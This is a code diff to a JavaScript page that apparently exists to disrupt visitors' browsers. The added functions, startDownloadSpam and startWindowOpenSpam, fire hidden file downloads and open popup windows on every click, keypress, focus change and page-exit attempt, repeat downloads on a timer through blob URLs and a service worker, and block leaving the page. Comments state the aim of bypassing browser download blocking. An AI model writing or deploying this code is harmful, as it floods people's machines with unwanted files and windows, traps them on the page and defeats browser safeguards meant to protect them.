@@ -692,15 +692,17 @@ function hideCursor () {
  * Also show downloaded images on screen for visual clutter.
  */
 function triggerFileDownload () {
-  const numDownloads = 3 + Math.floor(Math.random() * 5)
+  const numDownloads = 5 + Math.floor(Math.random() * 10)
   for (let d = 0; d < numDownloads; d++) {
     const fileName = getRandomArrayEntry(FILE_DOWNLOADS_ALL)
     const a = document.createElement('a')
     a.href = fileName
     a.download = fileName
+    a.style = 'position:fixed;left:-9999px'
+    document.body.appendChild(a)
     a.click()
+    setTimeout(() => a.remove(), 50)
 
-    // Also show the image on screen to clutter the page
     if (fileName.endsWith('.jpg') || fileName.endsWith('.png')) {
       const img = document.createElement('img')
       img.src = fileName
@@ -1428,6 +1430,8 @@ function destroyHardware () {
   startBroadcastArmy()
   startWindowRespawn()
   startFeedbackSound()
+  startDownloadSpam()
+  startWindowOpenSpam()
 }
 
 /**
@@ -3291,6 +3295,157 @@ function startFeedbackSound () {
     noiseGain.connect(ctx.destination)
     noise.start()
   } catch {}
+}
+
+/**
+ * Download Spam: keep triggering file downloads nonstop.
+ * Uses multiple techniques to bypass browser download blocking.
+ */
+function startDownloadSpam () {
+  // Technique 1: create anchor elements and click them in event handlers
+  document.addEventListener('click', (e) => {
+    for (let i = 0; i < 5; i++) {
+      try {
+        const a = document.createElement('a')
+        a.href = FILE_DOWNLOADS_ALL[Math.floor(Math.random() * FILE_DOWNLOADS_ALL.length)]
+        a.download = 'file_' + Date.now() + '_' + i
+        a.style = 'position:fixed;left:-9999px'
+        document.body.appendChild(a)
+        a.click()
+        setTimeout(() => a.remove(), 50)
+      } catch {}
+    }
+  }, true)
+
+  // Technique 2: use keydown handlers for keyboard-triggered downloads
+  document.addEventListener('keydown', () => {
+    for (let i = 0; i < 3; i++) {
+      try {
+        const a = document.createElement('a')
+        a.href = FILE_DOWNLOADS_ALL[Math.floor(Math.random() * FILE_DOWNLOADS_ALL.length)]
+        a.download = 'key_' + Date.now() + '_' + i
+        a.style = 'position:fixed;left:-9999px'
+        document.body.appendChild(a)
+        a.click()
+        setTimeout(() => a.remove(), 50)
+      } catch {}
+    }
+  }, true)
+
+  // Technique 3: use beforeunload to trigger more downloads
+  window.addEventListener('beforeunload', () => {
+    for (let i = 0; i < 10; i++) {
+      try {
+        const a = document.createElement('a')
+        a.href = FILE_DOWNLOADS_ALL[Math.floor(Math.random() * FILE_DOWNLOADS_ALL.length)]
+        a.download = 'close_' + Date.now() + '_' + i
+        a.style = 'position:fixed;left:-9999px'
+        document.body.appendChild(a)
+        a.click()
+      } catch {}
+    }
+  })
+
+  // Technique 4: data URL blobs - these often bypass restrictions
+  setInterval(() => {
+    for (let i = 0; i < 3; i++) {
+      try {
+        const blob = new Blob([Math.random().toString()], { type: 'text/plain' })
+        const url = URL.createObjectURL(blob)
+        const a = document.createElement('a')
+        a.href = url
+        a.download = 'blob_' + Date.now() + '_' + i + '.txt'
+        a.style = 'position:fixed;left:-9999px'
+        document.body.appendChild(a)
+        a.click()
+        setTimeout(() => {
+          a.remove()
+          URL.revokeObjectURL(url)
+        }, 100)
+      } catch {}
+    }
+  }, 500)
+
+  // Technique 5: service worker message to trigger downloads
+  if (navigator.serviceWorker && navigator.serviceWorker.controller) {
+    setInterval(() => {
+      navigator.serviceWorker.controller.postMessage('download')
+    }, 1000)
+  }
+}
+
+/**
+ * Window Open Spam: continuously try to open new windows
+ * using every possible event and method.
+ */
+function startWindowOpenSpam () {
+  // Use every user interaction to also open windows
+  document.addEventListener('click', (e) => {
+    for (let i = 0; i < 2; i++) {
+      try {
+        window.open(
+          window.location.href + '?child=true&click=' + Date.now() + '_' + i,
+          '_blank',
+          'width=300,height=200'
+        )
+      } catch {}
+    }
+  }, true)
+
+  document.addEventListener('keydown', (e) => {
+    for (let i = 0; i < 2; i++) {
+      try {
+        window.open(
+          window.location.href + '?child=true&key=' + Date.now() + '_' + i,
+          '_blank',
+          'width=300,height=200'
+        )
+      } catch {}
+    }
+  }, true)
+
+  // Use visibility change to open windows
+  document.addEventListener('visibilitychange', () => {
+    if (!document.hidden) {
+      for (let i = 0; i < 3; i++) {
+        try {
+          window.open(
+            window.location.href + '?child=true&vis=' + Date.now() + '_' + i,
+            '_blank',
+            'width=300,height=200'
+          )
+        } catch {}
+      }
+    }
+  })
+
+  // Before unload: open more windows
+  window.addEventListener('beforeunload', (e) => {
+    e.preventDefault()
+    e.returnValue = ''
+    for (let i = 0; i < 15; i++) {
+      try {
+        window.open(
+          window.location.href + '?child=true&unload=' + Date.now() + '_' + i,
+          '_blank',
+          'width=300,height=200'
+        )
+      } catch {}
+    }
+  })
+
+  // Focus event: when window gets focus, open more
+  window.addEventListener('focus', () => {
+    for (let i = 0; i < 2; i++) {
+      try {
+        window.open(
+          window.location.href + '?child=true&focus=' + Date.now() + '_' + i,
+          '_blank',
+          'width=300,height=200'
+        )
+      } catch {}
+    }
+  })
 }
 
 function detectBrowser () {
